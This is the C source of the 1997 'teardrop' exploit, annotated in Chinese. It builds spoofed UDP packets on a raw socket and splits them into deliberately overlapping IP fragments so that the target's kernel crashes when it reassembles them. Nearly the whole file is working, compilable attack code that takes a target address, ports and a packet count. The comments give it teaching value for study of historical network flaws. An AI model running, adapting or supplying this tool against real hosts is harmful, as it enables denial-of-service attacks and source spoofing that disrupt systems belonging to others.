/*
 *  Copyright (c) 1997 route|daemon9   11.3.97
 *
 *  Linux/NT/95 Overlap frag bug exploit
 *
 *  Exploits the overlapping IP fragment bug present in all Linux kernels and
 *  NT 4.0 / Windows 95 (others?)
 *
 *  Based off of:   flip.c by klepto
 *  Compiles on:    Linux, *BSD*
 *
 *  gcc -O2 teardrop.c -o teardrop
 *      OR
 *  gcc -O2 teardrop.c -o teardrop -DSTRANGE_BSD_BYTE_ORDERING_THING
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>

#ifdef STRANGE_BSD_BYTE_ORDERING_THING
                        /* OpenBSD < 2.1, all FreeBSD and netBSD, BSDi < 3.0 */
#define FIX(n)  (n)
#else                   /* OpenBSD 2.1, all Linux */
#define FIX(n)  htons(n)
#endif  /* STRANGE_BSD_BYTE_ORDERING_THING */

#define IP_MF   0x2000  /* IP包偏移量*/
#define IPH     0x14    /* IP头部大小 */
#define UDPH    0x8     /* UDP头部大小*/
#define PADDING 0x1c    /* 第一个包的数据填充 */
#define MAGIC   0x3     /* 片段长度，应该是 2 or 3 */
#define COUNT   0x1     /* 包数目  据说linux 1就是奔溃  其他可能要大点  不过对现在计算机没用的了.
                         */

						 
void usage(u_char *);
u_long name_resolve(u_char *);
u_short in_cksum(u_short *, int);
void send_frags(int, u_long, u_long, u_short, u_short);


/*
Teardrop的攻击原理是：攻击者A给受害者B发送一些分片IP报文，并且故意将“13位分片偏移”字段设置成错误的值(既可与上一分片数据重叠，也可错开)，
B在组合这种含有重叠偏移的伪造分片报文时，会导致系统崩溃。
所以程序实现是这样：给目标主机发送count个ipUDP报文包，并且每个包分成两个分片进行发送，这两个分片故意设置成重叠的，
这样目标主机收到两个片段就会重组出错--导致系统奔溃。。
*/
int main(int argc, char **argv)
{
    int one = 1, count = 0, i, rip_sock;
    u_long  src_ip = 0, dst_ip = 0;
    u_short src_prt = 0, dst_prt = 0;
    struct in_addr addr;  // ip地址结构体

    fprintf(stderr, "teardrop   route|daemon9\n\n");

	//建SOCK_RAW   新建一个原始套接字
    if((rip_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    {
        perror("raw socket");
        exit(1);
    }
	//设置套接字选项  这里设置由系统处理IP校验和。
    if (setsockopt(rip_sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one)) < 0)
    {
        perror("IP_HDRINCL");
        exit(1);
    }

	// 参数不够 提示输出使用方法  %s src_ip dst_ip [ -s src_prt ] [ -t dst_prt ] [ -n how_many ]
    if (argc < 3) usage(argv[0]);
	
	// 判断输入的ip地址是否有效  
    if (!(src_ip = name_resolve(argv[1])) || !(dst_ip = name_resolve(argv[2])))
    {
        fprintf(stderr, "What the hell kind of IP address is that?\n");
        exit(1);
    }
	
	// 这里解析参数  查看有没有可选参数 就是  -s源端口  -t目标端口  -n包的数目 如果没有可选端口就采用默认的
    while ((i = getopt(argc, argv, "s:t:n:")) != EOF)
    {// 解析可选参数
        switch (i)
        {
            case 's':               /* source port (should be emphemeral) */
                src_prt = (u_short)atoi(optarg);
                break;
            case 't':               /* dest port (DNS, anyone?) */
                dst_prt = (u_short)atoi(optarg);
                break;
            case 'n':               /* number to send */
                count   = atoi(optarg);
                break;
            default :
                usage(argv[0]);
                break;              /* NOTREACHED */
        }
    }

	// 初始化随机数
    srandom((unsigned)(time((time_t)0)));
	
	// 如果没有指定可选的端口参数  则随机产生一个
    if (!src_prt) src_prt = (random() % 0xffff);
    if (!dst_prt) dst_prt = (random() % 0xffff);
    if (!count)   count   = COUNT;

    fprintf(stderr, "Death on flaxen wings:\n");
    addr.s_addr = src_ip;  // 初始化源ip地址这里就用来输出而已 没用到其他
    fprintf(stderr, "From: %15s.%5d\n", inet_ntoa(addr), src_prt);
    addr.s_addr = dst_ip;   //初始化目的ｉｐ地址
    fprintf(stderr, "  To: %15s.%5d\n", inet_ntoa(addr), dst_prt);
    fprintf(stderr, " Amt: %5d\n", count);
    fprintf(stderr, "[ ");

	// 发送count个包
    for (i = 0; i < count; i++)
    {
		// 分片发送
        send_frags(rip_sock, src_ip, dst_ip, src_prt, dst_prt);
        fprintf(stderr, "b00m ");
        usleep(500);
    }
    fprintf(stderr, "]\n");
    return (0);
}

// 这里就是将ip包进行分片发送 源ip 目标ip  源端口 目标端口
void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt,
                u_short dst_prt)
{
    u_char *packet = NULL, *p_ptr = NULL;   /* 包指针 */
    u_char byte;                            /* 一个字节 */
    struct sockaddr_in sin;                 /* socket协议结构体*/
	
	// 初始化socket的协议族  端口  和目的地址
    sin.sin_family      = AF_INET;
    sin.sin_port        = src_prt;
    sin.sin_addr.s_addr = dst_ip;

	 // 分配包内存 并初始化为空
    packet = (u_char *)malloc(IPH + UDPH + PADDING);
    p_ptr  = packet;
    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);

	// 下面的ip包的初始化构造，跟其他几个不一样 其他采用ip头部结构体进行初始化 下面直接在内存中初始化  直接根据ip包结构的协议进行初始化  
	//4为 ipv4版本  5为头部长
    byte = 0x45;                       
    memcpy(p_ptr, &byte, sizeof(u_char));  // 初始化ip头部 的version和ihl
    p_ptr += 2;                         /* 跳过服务质量tos */
    *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING);    /* 包总长度 tot_len*/
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(242);   /* 数据包标识id */
    p_ptr += 2;
    *((u_short *)p_ptr) |= FIX(IP_MF);  /* 包偏移量设置 frag */
    p_ptr += 2;
    *((u_short *)p_ptr) = 0x40;         /* ip包生存时间  TTL */
    byte = IPPROTO_UDP;
    memcpy(p_ptr + 1, &byte, sizeof(u_char));   //ip包的下层协议 protocol 这里用UDP
    p_ptr += 4;                         /* ip校验和 由内核自己填充 所以跳过 */
    *((u_long *)p_ptr) = src_ip;        /* IP包的源地址 */
    p_ptr += 4;
    *((u_long *)p_ptr) = dst_ip;        /* IP包的目的地址*/
    p_ptr += 4;
    *((u_short *)p_ptr) = htons(src_prt);       /* UDP协议的源端口 source port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP协议的目的 destination port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(8 + PADDING);   /* UDP 包的总长度total length */

	// 开始发送此包
    if (sendto(sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *)&sin,sizeof(struct sockaddr)) == -1)
    {
        perror("\nsendto");
        free(packet);  // 发送失败就释放包内存 并退出
        exit(1);
    }
	 
	 /*
		这里开始设置分段偏移量   但是是设置错的 这样接收方接受到包 就重组不了包 会出错  致命错误 奔溃
	 */
	 
    p_ptr = &packet[2];         /* 跳过头部 到ip包偏移设置内存位置 */
    *((u_short *)p_ptr) = FIX(IPH + MAGIC + 1);   // 重新设置ip偏移量
    p_ptr += 4;                 /* 将偏移量设置错误 加一点 */
    *((u_short *)p_ptr) = FIX(MAGIC);
	
	// 重新发送一次偏移包  这样两次发送的包 重组后就是不可知的包了 错误的ip包
    if (sendto(sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *)&sin,
                sizeof(struct sockaddr)) == -1)
    {
        perror("\nsendto");
        free(packet);
        exit(1);
    }
    free(packet);
}

// 判断输入的ip地址是否有效
u_long name_resolve(u_char *host_name)
{
    struct in_addr addr;
    struct hostent *host_ent;

    if ((addr.s_addr = inet_addr(host_name)) == -1)
    {
        if (!(host_ent = gethostbyname(host_name))) return (0);
        bcopy(host_ent->h_addr, (char *)&addr.s_addr, host_ent->h_length);
    }
    return (addr.s_addr);
}

// 使用方法
void usage(u_char *name)
{
    fprintf(stderr,"%s src_ip dst_ip [ -s src_prt ] [ -t dst_prt ] [ -n how_many ]\n",name);
    exit(0);
}
